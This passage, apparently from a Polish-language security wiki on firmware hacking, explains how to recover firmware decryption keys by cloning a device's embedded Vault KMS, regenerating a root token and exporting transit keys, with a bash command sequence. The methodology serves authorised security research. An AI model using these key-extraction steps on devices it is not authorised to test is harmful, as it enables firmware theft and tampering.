- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu osadzonego KMS/Vault

Gdy obraz aktualizacji łączy niewielką ilość metadanych w plaintext z dużym blobem o wysokiej entropii, przed rozpoczęciem brute-force wykonaj triage kontenera:<sup>[[1]](#references)</sup>

- Zrzuć nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` oraz `binwalk -E`.
- `Salted__` zazwyczaj oznacza format OpenSSL `enc`: kolejne 8 bajtów to salt, a pozostałe bajty to ciphertext.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, jest silną wskazówką, że analizujesz ciphertext RSA-2048 opakowujący losowe hasło/klucz sesyjny firmware.
- Odłączony materiał PGP w tym samym pliku często zapewnia wyłącznie autentyczność; nie zakładaj, że jest mechanizmem zapewniającym poufność.

Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynosi rezultatów, wykonaj reverse engineering **operacyjnej ścieżki deszyfrowania**, zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj binarkę updatera / zarządzającą i prześledź, kto odczytuje zaszyfrowany blob, który helper/API go rozwija oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony root filesystem pod kątem stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), a także unit files i skryptów init.
- Traktuj jawne polecenia `vault operator unseal ...`, klucze recovery, tokeny bootstrap lub lokalne skrypty automatycznego odpieczętowywania KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli urządzenie zawiera oryginalną binarkę Vault i backend storage, odtworzenie tego środowiska jest zazwyczaj łatwiejsze niż ponowne implementowanie mechanizmów wewnętrznych Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Z uprawnieniami root na sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne wyłącznie w odizolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Wypróbuj odzyskany klucz RSA z dokładną parą padding/hash używaną przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez dostawcę (`EVP_BytesToKey`, często MD5 w starszych appliances) przed próbą odszyfrowania AES-CBC.

Zmienia to problem „zaszyfrowanego firmware” w bardziej ogólny problem: **odzyskaj klucze operacyjne po stronie appliance, a następnie offline odtwórz dokładne parametry unwrap + KDF**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Łamanie firmware za pomocą Claude: umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodyka testowania bezpieczeństwa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczny hacking IoT: Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym hardware – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 dolarów dało mi dostęp do Twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Wykorzystywanie Tesla Wall Connector przez jego złącze portu ładowania - część 2: omijanie mechanizmu anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: wykorzystywanie Philips Hue Bridge drogą Over-the-Air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
